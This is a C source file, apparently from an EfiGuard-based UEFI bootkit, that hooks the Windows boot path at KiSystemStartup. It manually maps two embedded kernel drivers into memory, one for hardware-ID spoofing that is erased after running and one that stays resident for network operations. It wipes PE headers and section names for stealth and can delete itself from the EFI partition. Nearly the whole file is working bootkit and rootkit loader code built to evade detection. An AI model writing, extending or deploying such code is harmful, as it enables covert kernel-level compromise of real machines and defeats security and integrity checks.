/**
 * OslTransferHook.c - OslArchTransferToKernel Hook Implementation
 * 
 * Dual-driver loading sequence:
 * 1. DKOM.sys - Execute and erase (ephemeral hardware spoofing)
 * 2. RWbase.sys - Map persistently (background network ops)
 */

#include "OslTransferHook.h"
#include "SelfDelete.h"
#include "util.h"
#include <Zydis/Zydis.h>
#include <Library/BaseMemoryLib.h>

//
// Embedded driver binaries (generated by bin2header.py)
// These will be created during build process
//
//
// Embedded driver binaries (generated by bin2header.py)
// These will be created during build process
//
//#define EFIGUARD_EMBED_DRIVERS
#ifdef EFIGUARD_EMBED_DRIVERS
#include "DKOM_bin.h"
#include "RWbase_bin.h"
#else
// Placeholder for development - will be replaced with actual data
STATIC CONST UINT8 DKOM_RawData[] = { 0 };
STATIC CONST UINT32 DKOM_RawDataSize = 0;
STATIC CONST UINT8 RWbase_RawData[] = { 0 };
STATIC CONST UINT32 RWbase_RawDataSize = 0;
#endif

//
// Global variables for assembly stub access
//
UINT64 G_SavedRax_Temp = 0;
UINT8* gOriginalTransferAddr = NULL;

//
// Internal mapping context
//
STATIC MAPPING_CONTEXT gMapCtx = {0};

//
// Primary signature for OslArchTransferToKernel (Windows 10 20H1+, no KVA Shadow)
// Pattern: mov rcx, rax; mov cr3, rax; ...; jmp rdx
//
STATIC CONST UINT8 SigOslArchTransferPrimary[] = {
    0x48, 0x8B, 0xC8,           // mov rcx, rax
    0x0F, 0x22, 0xD8,           // mov cr3, rax  <-- Critical point
    0xCC, 0xCC,                 // (variable padding/nops)
    0xFF, 0xE2                  // jmp rdx
};

//
// Fallback signature (more permissive matching)
//
STATIC CONST UINT8 SigOslArchTransferFallback[] = {
    0x0F, 0x22, 0xD8,           // mov cr3, rax
    0xCC, 0xCC, 0xCC, 0xCC,     // (variable)
    0xFF, 0xE2                  // jmp rdx
};

//
// Find ntoskrnl.exe base address from LoaderBlock
//
STATIC
UINT8*
EFIAPI
FindNtoskrnlBase(
    IN PLOADER_PARAMETER_BLOCK LoaderBlock
    )
{
    if (LoaderBlock == NULL)
        return NULL;

    PLIST_ENTRY Head = &LoaderBlock->LoadOrderListHead;
    for (PLIST_ENTRY Entry = Head->Flink; Entry != Head; Entry = Entry->Flink)
    {
        PKLDR_DATA_TABLE_ENTRY Module = CONTAINING_RECORD(
            Entry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        
        if (Module->BaseDllName.Buffer != NULL)
        {
            // Check for ntoskrnl variants
            if (StriStr(Module->BaseDllName.Buffer, L"ntoskrnl") != NULL ||
                StriStr(Module->BaseDllName.Buffer, L"ntkrnlmp") != NULL ||
                StriStr(Module->BaseDllName.Buffer, L"ntkrnlpa") != NULL)
            {
                return (UINT8*)Module->DllBase;
            }
        }
    }
    return NULL;
}

//
// Process base relocations for manual mapping
//
EFI_STATUS
EFIAPI
ProcessRelocations(
    IN UINT8* ImageBase,
    IN PEFI_IMAGE_NT_HEADERS NtHeaders,
    IN INT64 Delta
    )
{
    if (Delta == 0)
        return EFI_SUCCESS;
    
    PEFI_IMAGE_DATA_DIRECTORY RelocDir = 
        &NtHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_BASERELOC];
    
    if (RelocDir->VirtualAddress == 0 || RelocDir->Size == 0)
        return EFI_SUCCESS;
    
    PIMAGE_BASE_RELOCATION Reloc = 
        (PIMAGE_BASE_RELOCATION)(ImageBase + RelocDir->VirtualAddress);
    UINT8* RelocEnd = (UINT8*)Reloc + RelocDir->Size;
    
    while ((UINT8*)Reloc < RelocEnd && Reloc->SizeOfBlock > 0)
    {
        UINT32 Count = (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(UINT16);
        UINT16* Entry = (UINT16*)((UINT8*)Reloc + sizeof(IMAGE_BASE_RELOCATION));
        
        for (UINT32 i = 0; i < Count; i++)
        {
            UINT16 Type = Entry[i] >> 12;
            UINT16 Offset = Entry[i] & 0xFFF;
            
            if (Type == EFI_IMAGE_REL_BASED_DIR64)
            {
                UINT64* Target = (UINT64*)(ImageBase + Reloc->VirtualAddress + Offset);
                *Target += Delta;
            }
            else if (Type == EFI_IMAGE_REL_BASED_HIGHLOW)
            {
                UINT32* Target = (UINT32*)(ImageBase + Reloc->VirtualAddress + Offset);
                *Target += (UINT32)Delta;
            }
            // EFI_IMAGE_REL_BASED_ABSOLUTE (0) is padding, ignore
        }
        
        Reloc = (PIMAGE_BASE_RELOCATION)((UINT8*)Reloc + Reloc->SizeOfBlock);
    }
    
    return EFI_SUCCESS;
}

//
// Resolve imports from ntoskrnl.exe
//
EFI_STATUS
EFIAPI
ResolveImportsFromKernel(
    IN UINT8* ImageBase,
    IN PEFI_IMAGE_NT_HEADERS NtHeaders,
    IN MAPPING_CONTEXT* Ctx
    )
{
    PEFI_IMAGE_DATA_DIRECTORY ImportDir = 
        &NtHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_IMPORT];
    
    if (ImportDir->VirtualAddress == 0 || ImportDir->Size == 0)
        return EFI_SUCCESS;
    
    PIMAGE_IMPORT_DESCRIPTOR Import = 
        (PIMAGE_IMPORT_DESCRIPTOR)(ImageBase + ImportDir->VirtualAddress);
    
    while (Import->Name != 0)
    {
        CHAR8* DllName = (CHAR8*)(ImageBase + Import->Name);
        
        // Resolve from ntoskrnl for kernel imports
        UINT8* ResolveBase = NULL;
        PEFI_IMAGE_NT_HEADERS ResolveNtHdr = NULL;
        
        if (AsciiStriCmp(DllName, "ntoskrnl.exe") == 0 ||
            AsciiStriCmp(DllName, "ntkrnlpa.exe") == 0 ||
            AsciiStriCmp(DllName, "ntkrnlmp.exe") == 0 ||
            AsciiStriCmp(DllName, "HAL.dll") == 0)
        {
            ResolveBase = Ctx->NtoskrnlBase;
            ResolveNtHdr = Ctx->NtoskrnlNtHeaders;
        }
        
        if (ResolveBase != NULL && ResolveNtHdr != NULL)
        {
            UINT64* Thunk = (UINT64*)(ImageBase + Import->FirstThunk);
            UINT64* OrigThunk = Import->u.OriginalFirstThunk ? 
                (UINT64*)(ImageBase + Import->u.OriginalFirstThunk) : Thunk;
            
            while (*OrigThunk != 0)
            {
                // Check if import by name (not ordinal)
                if (!(*OrigThunk & IMAGE_ORDINAL_FLAG64))
                {
                    PIMAGE_IMPORT_BY_NAME ByName = 
                        (PIMAGE_IMPORT_BY_NAME)(ImageBase + (UINT32)*OrigThunk);
                    
                    VOID* Proc = GetProcedureAddress(
                        (UINTN)ResolveBase, 
                        ResolveNtHdr, 
                        (CONST CHAR8*)ByName->Name);
                    
                    if (Proc != NULL)
                    {
                        *Thunk = (UINT64)Proc;
                    }
                }
                
                Thunk++;
                OrigThunk++;
            }
        }
        
        Import++;
    }
    
    return EFI_SUCCESS;
}

//
// Map and execute a driver with manual mapping
//
EFI_STATUS
EFIAPI
MapAndExecuteDriver(
    IN CONST UINT8* DriverRawData,
    IN UINT32 DriverSize,
    IN OUT MAPPING_CONTEXT* Ctx,
    IN BOOLEAN EraseAfterExec
    )
{
    if (DriverRawData == NULL || DriverSize == 0)
        return EFI_INVALID_PARAMETER;
    
    // Parse PE headers
    PEFI_IMAGE_NT_HEADERS NtHdr = RtlpImageNtHeaderEx(DriverRawData, DriverSize);
    if (NtHdr == NULL)
    {
        PRINT_KERNEL_PATCH_MSG(L"[!] Invalid PE header in driver image\r\n");
        return EFI_INVALID_PARAMETER;
    }
    
    UINT32 ImageSize = NtHdr->OptionalHeader.SizeOfImage;
    
    // Allocate kernel memory (EfiRuntimeServicesCode survives ExitBootServices)
    EFI_PHYSICAL_ADDRESS PhysAddr = 0;
    EFI_STATUS Status = gBS->AllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesCode,
        EFI_SIZE_TO_PAGES(ImageSize),
        &PhysAddr);
    
    if (EFI_ERROR(Status))
    {
        PRINT_KERNEL_PATCH_MSG(L"[!] Failed to allocate %u bytes: %r\r\n", ImageSize, Status);
        return Status;
    }
    
    UINT8* MappedBase = (UINT8*)PhysAddr;
    SetMem(MappedBase, ImageSize, 0);
    
    // Copy PE headers
    CopyMem(MappedBase, DriverRawData, NtHdr->OptionalHeader.SizeOfHeaders);
    
    // Copy sections
    PEFI_IMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(NtHdr);
    for (UINT16 i = 0; i < NtHdr->FileHeader.NumberOfSections; i++)
    {
        if (Section[i].SizeOfRawData > 0)
        {
            CopyMem(
                MappedBase + Section[i].VirtualAddress,
                DriverRawData + Section[i].PointerToRawData,
                Section[i].SizeOfRawData);
        }
    }
    
    // Get NT headers from mapped image
    PEFI_IMAGE_NT_HEADERS MappedNtHdr = RtlpImageNtHeaderEx(MappedBase, ImageSize);
    
    // Process relocations
    INT64 Delta = (INT64)MappedBase - (INT64)NtHdr->OptionalHeader.ImageBase;
    Status = ProcessRelocations(MappedBase, MappedNtHdr, Delta);
    if (EFI_ERROR(Status))
    {
        PRINT_KERNEL_PATCH_MSG(L"[!] Relocation processing failed: %r\r\n", Status);
        goto Cleanup;
    }
    
    // Resolve imports from ntoskrnl
    Status = ResolveImportsFromKernel(MappedBase, MappedNtHdr, Ctx);
    if (EFI_ERROR(Status))
    {
        PRINT_KERNEL_PATCH_MSG(L"[!] Import resolution failed: %r\r\n", Status);
        goto Cleanup;
    }
    
    // Wipe PE headers for stealth
    SetMem(MappedBase, MappedNtHdr->OptionalHeader.SizeOfHeaders, 0);
    
    PRINT_KERNEL_PATCH_MSG(L"[+] Driver mapped at 0x%p, calling entry...\r\n", MappedBase);
    
    // Call driver entry point
    typedef NTSTATUS (NTAPI *DRIVER_ENTRY_FN)(VOID* DriverObject, VOID* RegistryPath);
    DRIVER_ENTRY_FN DriverEntry = (DRIVER_ENTRY_FN)(
        MappedBase + NtHdr->OptionalHeader.AddressOfEntryPoint);
    
    // Execute driver entry (NULL params for manual mapping)
    NTSTATUS NtStatus = DriverEntry(NULL, NULL);
    PRINT_KERNEL_PATCH_MSG(L"[+] Driver entry returned: 0x%08X\r\n", NtStatus);
    
    // Ephemeral drivers: erase immediately after execution
    if (EraseAfterExec)
    {
        PRINT_KERNEL_PATCH_MSG(L"[+] Erasing ephemeral driver memory...\r\n");
        SetMem(MappedBase, ImageSize, 0);
        gBS->FreePages(PhysAddr, EFI_SIZE_TO_PAGES(ImageSize));
        MappedBase = NULL;
    }
    else
    {
        // Persistent driver: store base address
        Ctx->RWbaseMappedBase = MappedBase;
        
        // Erase section names to prevent memory string scanning
        PEFI_IMAGE_SECTION_HEADER MappedSection = IMAGE_FIRST_SECTION(
            RtlpImageNtHeaderEx(DriverRawData, DriverSize));
        UINT8* SectionHeaderBase = MappedBase + 
            ((UINT8*)MappedSection - DriverRawData);
        for (UINT16 i = 0; i < NtHdr->FileHeader.NumberOfSections; i++)
        {
            // Zero out section name (.text, .data, .rdata, etc.)
            SetMem(SectionHeaderBase + (i * sizeof(EFI_IMAGE_SECTION_HEADER)), 8, 0);
        }
        PRINT_KERNEL_PATCH_MSG(L"[+] Section names erased for stealth\\r\\n");
    }
    
    return EFI_SUCCESS;

Cleanup:
    if (PhysAddr != 0)
    {
        SetMem(MappedBase, ImageSize, 0);
        gBS->FreePages(PhysAddr, EFI_SIZE_TO_PAGES(ImageSize));
    }
    return Status;
}

//
// Main hook handler - dual driver loading sequence
//
EFI_STATUS
EFIAPI
HookedOslArchTransfer(
    IN UINT64 LoaderBlock,
    IN UINT64 KernelEntry,
    IN UINT64 SavedRax
    )
{
    // Store critical register values
    gMapCtx.SavedRax = SavedRax;
    gMapCtx.LoaderBlock = LoaderBlock;
    gMapCtx.KernelEntry = KernelEntry;
    
    PRINT_KERNEL_PATCH_MSG(L"\r\n[OslTransferHook] SavedRax=0x%llX, LoaderBlock=0x%llX, Entry=0x%llX\r\n",
        SavedRax, LoaderBlock, KernelEntry);
    
    // Step 1: Locate ntoskrnl.exe from LoaderBlock
    gMapCtx.NtoskrnlBase = FindNtoskrnlBase((PLOADER_PARAMETER_BLOCK)LoaderBlock);
    if (gMapCtx.NtoskrnlBase == NULL)
    {
        PRINT_KERNEL_PATCH_MSG(L"[!] Failed to locate ntoskrnl.exe in LoaderBlock\r\n");
        goto Exit;
    }
    
    gMapCtx.NtoskrnlNtHeaders = RtlpImageNtHeaderEx(gMapCtx.NtoskrnlBase, 0);
    PRINT_KERNEL_PATCH_MSG(L"[+] ntoskrnl.exe found at 0x%p\r\n", gMapCtx.NtoskrnlBase);
    
#ifdef EFIGUARD_EMBED_DRIVERS
    // Step 2: Load DKOM (ephemeral - execute and erase)
    if (DKOM_RawDataSize > 0)
    {
        PRINT_KERNEL_PATCH_MSG(L"[+] Mapping DKOM.sys (%u bytes, ephemeral)...\r\n", DKOM_RawDataSize);
        EFI_STATUS Status = MapAndExecuteDriver(DKOM_RawData, DKOM_RawDataSize, &gMapCtx, TRUE);
        if (EFI_ERROR(Status))
        {
            PRINT_KERNEL_PATCH_MSG(L"[!] DKOM mapping failed: %r\r\n", Status);
        }
    }
    
    // Step 3: Load RWbase (persistent - stays in memory)
    if (RWbase_RawDataSize > 0)
    {
        PRINT_KERNEL_PATCH_MSG(L"[+] Mapping RWbase.sys (%u bytes, persistent)...\r\n", RWbase_RawDataSize);
        EFI_STATUS Status = MapAndExecuteDriver(RWbase_RawData, RWbase_RawDataSize, &gMapCtx, FALSE);
        if (EFI_ERROR(Status))
        {
            PRINT_KERNEL_PATCH_MSG(L"[!] RWbase mapping failed: %r\r\n", Status);
        }
    }
#else
    PRINT_KERNEL_PATCH_MSG(L"[!] No embedded drivers (EFIGUARD_EMBED_DRIVERS not defined)\r\n");
#endif

    // Step 4: Self-delete EFI from ESP (after ExitBootServices, before kernel jump)
    // This is the safe window: firmware FS driver still available, Windows not yet in control
#ifdef EFIGUARD_SELF_DELETE
    extern EFI_HANDLE gEfiGuardImageHandle;
    if (gEfiGuardImageHandle != NULL)
    {
        PRINT_KERNEL_PATCH_MSG(L"[+] Deleting self from ESP...\r\n");
        DeleteSelfFromDisk(gEfiGuardImageHandle);
    }
#endif

Exit:
    // Store SavedRax for assembly stub to restore
    G_SavedRax_Temp = SavedRax;
    
    return EFI_SUCCESS;
}

//
// Global variable for KiSystemStartup trampoline
//
UINT8* gOriginalKiSystemStartup = NULL;

//
// Hook handler for KiSystemStartup (Kernel Entry)
//
VOID
EFIAPI
HookedKiSystemStartup(
    IN UINT64 LoaderBlock
    )
{
    PRINT_KERNEL_PATCH_MSG(L"\r\n[KiSystemStartup] Hook triggered! LoaderBlock=0x%llX\r\n", LoaderBlock);
    
    // Initialize mapping context if needed
    if (gMapCtx.NtoskrnlBase == NULL)
    {
         gMapCtx.NtoskrnlBase = FindNtoskrnlBase((PLOADER_PARAMETER_BLOCK)LoaderBlock);
    }
    
     if (gMapCtx.NtoskrnlBase != NULL && gMapCtx.NtoskrnlNtHeaders == NULL)
    {
        gMapCtx.NtoskrnlNtHeaders = RtlpImageNtHeaderEx(gMapCtx.NtoskrnlBase, 0);
    }

#ifdef EFIGUARD_EMBED_DRIVERS
    // Load DKOM (ephemeral)
    if (DKOM_RawDataSize > 0)
    {
        PRINT_KERNEL_PATCH_MSG(L"[+] Mapping DKOM.sys...\r\n");
        MapAndExecuteDriver(DKOM_RawData, DKOM_RawDataSize, &gMapCtx, TRUE);
    }
    
    // Load RWbase (persistent)
    if (RWbase_RawDataSize > 0)
    {
        PRINT_KERNEL_PATCH_MSG(L"[+] Mapping RWbase.sys...\r\n");
        MapAndExecuteDriver(RWbase_RawData, RWbase_RawDataSize, &gMapCtx, FALSE);
    }
#else
    PRINT_KERNEL_PATCH_MSG(L"[KiSystemStartup] No embedded drivers to map.\r\n");
#endif

    //
    // Self-Cleanup: Unhook KiSystemStartup
    //
    if (gOriginalKiSystemStartup != NULL && gMapCtx.NtoskrnlBase != NULL)
    {
        VOID* KiSystemStartup = GetProcedureAddress(
            (UINTN)gMapCtx.NtoskrnlBase,
            gMapCtx.NtoskrnlNtHeaders,
            "KiSystemStartup"
        );
        
        if (KiSystemStartup != NULL)
        {
            PRINT_KERNEL_PATCH_MSG(L"[+] Restoring KiSystemStartup bytes...\r\n");
            // Use CopyWpMem to handle CR0.WP
            CopyWpMem(KiSystemStartup, gOriginalKiSystemStartup, sizeof(gHookTemplate));
        }
    }
    
    PRINT_KERNEL_PATCH_MSG(L"[+] KiSystemStartup payload complete. Continuing boot.\r\n");
}

//
// Setup hook on KiSystemStartup via OslFwpKernelSetupPhase1
//
VOID
EFIAPI
SetupKiSystemStartupHook(
    IN PLOADER_PARAMETER_BLOCK LoaderBlock
    )
{
    if (LoaderBlock == NULL) return;
    
    // 1. Find ntoskrnl.exe
    UINT8* KernelBase = FindNtoskrnlBase(LoaderBlock);

    // [DEBUG] Canary: Check if we are alive and what the address is
    Print(L"[DEBUG] SetupKiSystemStartupHook reached. KernelBase candidate: 0x%p\r\n", KernelBase);
    gBS->Stall(2000000); // Stall 2s to allow reading logs

    if (KernelBase == NULL)
    {
        Print(L"[!] SetupKiSystemStartupHook: Failed to find ntoskrnl base\r\n");
        return;
    }

    //
    // [SAFETY] Helper: Convert High VA to PA (Heuristic)
    //
    if ((UINT64)KernelBase > 0xFFFFFFFF00000000ULL)
    {
        Print(L"[!] Warning: High VA detected. Attempting PA conversion...\r\n");
        
        // Try simple masking for < 4GB physical loading (Common in UEFI)
        // Or masking sign extension. KVA typically: 0xFFFFF80...
        // We try masking off to get 32-bit address
        UINT64 CandidatePA = (UINT64)KernelBase & 0xFFFFFFFF; // Lower 32 bits
        
        // Check for 'MZ' signature at candidate
        // Safe read? We hope this low address is mapped.
        if (*(UINT16*)CandidatePA == 0x5A4D) 
        {
            Print(L"[+] PA conversion success? Found MZ at 0x%p\r\n", CandidatePA);
            KernelBase = (UINT8*)CandidatePA;
        }
        else
        {
            Print(L"[!] PA heuristic failed at 0x%p (No MZ). trying standard identity...\r\n", CandidatePA);
        }
    }
    
    // 2. Parse Headers
    PEFI_IMAGE_NT_HEADERS NtHeaders = RtlpImageNtHeaderEx(KernelBase, 0);
    if (NtHeaders == NULL)
    {
        Print(L"[!] SetupKiSystemStartupHook: Invalid NT headers\r\n");
        return;
    }
    
    // Store in global context
    gMapCtx.NtoskrnlBase = KernelBase;
    gMapCtx.NtoskrnlNtHeaders = NtHeaders;
    
    // 3. Find KiSystemStartup (Kernel Entry Point)
    UINT8* KiSystemStartup = KernelBase + NtHeaders->OptionalHeader.AddressOfEntryPoint;
    
    //
    // [SAFETY] High VA Check (Again for EntryPoint)
    //
    if ((UINT64)KiSystemStartup > 0xFFFFFFFF00000000ULL)
    {
         Print(L"[!] Warning: KiSystemStartup is High VA (0x%p). Access might fault!\r\n", KiSystemStartup);
    }

    Print(L"[+] Starting Safe Scan at 0x%p...\r\n", KiSystemStartup);
    gBS->Stall(1000000); // Another stall before read

    //
    // [SAFETY] Manual SwapGS Scan (0F 01 F8) - Avoid Zydis here to prevent faults on over-read
    //
    UINT8* SafeHookPos = NULL;
    
    // Scan limit 128 bytes
    for (UINT32 i = 0; i < 128; i++) 
    {
        // Simple byte comparison
        if (KiSystemStartup[i] == 0x0F && KiSystemStartup[i+1] == 0x01 && KiSystemStartup[i+2] == 0xF8) 
        {
            SafeHookPos = KiSystemStartup + i + 3; // Hook AFTER swapgs
            Print(L"[+] Found swapgs at offset 0x%X (SafeHookPos=0x%p)\r\n", i, SafeHookPos);
            break;
        }
    }
    
    // Fallback: Skip 32 bytes if swapgs not found
    if (SafeHookPos == NULL)
    {
        Print(L"[!] swapgs not found, using fallback offset +32\r\n");
        SafeHookPos = KiSystemStartup + 32;
    }
    
    //
    // [SAFETY] Stolen Bytes Calculation
    // We need 14 bytes for the absolute JMP. 
    // We want to avoid cutting instructions.
    // Since we removed Zydis, we will use a safe assumption of 15 bytes.
    //
    UINT32 StolenBytes = 15;
    
    Print(L"[+] StolenBytes set to: %u\r\n", StolenBytes);
    
    // 4. Create Trampoline
    // We need StolenBytes + JMP (14 bytes)
    // UINT32 TrampolineSize = StolenBytes + sizeof(gHookTemplate); 
    EFI_PHYSICAL_ADDRESS TrampolinePhysAddr = 0;
    EFI_STATUS Status = gBS->AllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesCode,
        1, // 4KB is enough
        &TrampolinePhysAddr);
        
    if (EFI_ERROR(Status))
    {
        Print(L"[!] Failed to allocate trampoline: %r\r\n", Status);
        return;
    }
    
    UINT8* Trampoline = (UINT8*)TrampolinePhysAddr;
    
    // Copy stolen instructions
    CopyMem(Trampoline, SafeHookPos, StolenBytes);
    
    // Create JMP back to SafeHookPos + StolenBytes
    UINT8* JmpBackLocation = Trampoline + StolenBytes;
    JmpBackLocation[0] = 0xE9; // JMP rel32? No, we need absolute jump back standard
    
    // Use the gHookTemplate format for the return jump as well for simplicity (Absolute JMP)
    CopyMem(JmpBackLocation, gHookTemplate, sizeof(gHookTemplate));
    
    // Fixup the address in the return jump
    UINT8* ReturnTarget = SafeHookPos + StolenBytes;
    // gHookTemplate: [JMP qword ptr [rip+0]] [Address]
    // Write the return address into the template
    *(VOID**)(&JmpBackLocation[gHookTemplateAddressOffset]) = (VOID*)ReturnTarget;
    
    gOriginalKiSystemStartup = Trampoline;
    
    // 5. Install Hook at SafeHookPos
    UINT8 HookBytes[sizeof(gHookTemplate)];
    CopyMem(HookBytes, gHookTemplate, sizeof(gHookTemplate));
    *(VOID**)(&HookBytes[gHookTemplateAddressOffset]) = (VOID*)KiSystemStartupStub;
    
    // If stolen bytes > hook size, we should NOP the remaining bytes
    // But inline hook writes 14 bytes. If StolenBytes > 14, we leave the tail of the last stolen instruction undefined in the original stream?
    // No, we overwrite 14 bytes. If StolenBytes was 15, we overwrite 14. The 15th byte remains at SafeHookPos+14.
    // Executing SafeHookPos+14 (garbage tail) is bad?
    // Wait. The kernel executes the Hook -> Stub -> Trampoline -> ReturnTarget (SafeHookPos + StolenBytes).
    // The kernel NEVER executes SafeHookPos anymore. It jumps over it.
    // So the garbage bytes at SafeHookPos + 14 (if any) are skipped by the flow.
    // Yes.
    
    // Write hook (handle WP)
    // ONLY write the 14 bytes of the hook template.
    Print(L"[+] Installing Hook at 0x%p -> 0x%p\r\n", SafeHookPos, KiSystemStartupStub);
    gBS->Stall(500000); // 0.5s stall

    CopyWpMem(SafeHookPos, HookBytes, sizeof(HookBytes));
    
    // Optional: NOP the remaining bytes if StolenBytes > 14?
    // Not strictly necessary as they are skipped, but cleaner for debugging.
    if (StolenBytes > sizeof(HookBytes))
    {
         UINT32 NopCount = StolenBytes - sizeof(HookBytes);
         UINT8* Nops = AllocatePool(NopCount);
         SetMem(Nops, NopCount, 0x90);
         CopyWpMem(SafeHookPos + sizeof(HookBytes), Nops, NopCount);
         FreePool(Nops);
    }
    
    Print(L"[+] KiSystemStartup hooked at 0x%p -> 0x%p\r\n", SafeHookPos, KiSystemStartupStub);
}

//
// Install hook on OslArchTransferToKernel - DISABLED
//
EFI_STATUS
EFIAPI
HookOslArchTransfer(
    IN CONST UINT8* WinloadBase,
    IN PEFI_IMAGE_NT_HEADERS NtHeaders
    )
{
    (VOID)WinloadBase;
    (VOID)NtHeaders;
    PRINT_KERNEL_PATCH_MSG(L"[+] HookOslArchTransfer skipped (using KiSystemStartup hook)\r\n");
    return EFI_SUCCESS;
}
